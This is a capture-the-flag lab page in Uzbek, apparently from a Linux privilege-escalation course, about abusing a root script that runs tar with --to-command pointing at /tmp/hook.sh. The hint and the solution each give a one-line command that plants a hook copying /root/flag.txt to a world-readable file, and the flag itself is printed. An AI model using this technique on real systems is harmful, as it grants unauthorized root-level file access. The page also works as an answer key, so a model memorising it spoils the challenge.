---
id: 42
title: "CH42: Tar --to-command Script Injection in Backup"
module: "Modul 5: Automation, Systemd & Kernel"
difficulty: Hard
points: 9
tags: ['tar', 'to-command', 'backup', 'privesc']
flag: "HD{tar_to_command_injection_root_exploit_942}"
---

# 🎯 Topshiriq #42: CH42: Tar --to-command Script Injection in Backup

## 📌 Metama'lumotlar:
* **Modul:** `Modul 5: Automation, Systemd & Kernel`
* **Qiyinlik darajasi:** `🔴 Hard`
* **Maksimal Ball:** `⭐ 9 ball`
* **Teglar:** #tar, #to-command, #backup, #privesc

---

## 📝 Topshiriq Senariysi (Scenario):
Avtomatlashtirilgan root skripti 'tar --to-command=/tmp/hook.sh -xf /backup/update.tar' ni bajaradi. /tmp/hook.sh ni yaratib root imtiyozini qo'lga kiriting.

---

## 💡 Kichik Maslahat (Hint):
> [!TIP]
> echo -e '#!/bin/sh\ncat /root/flag.txt > /tmp/flag\nchmod 777 /tmp/flag' > /tmp/hook.sh && chmod +x /tmp/hook.sh

---

## 🛠️ Professional Yechim Ko'rsatmasi:
```bash
# Topshiriqni yechish bo'yicha ko'rsatma:
echo -e '#!/bin/sh\ncat /root/flag.txt > /tmp/flag\nchmod 777 /tmp/flag' > /tmp/hook.sh && chmod +x /tmp/hook.sh
```

---

## 🚩 Maxfiy Flag:
`HD{tar_to_command_injection_root_exploit_942}`
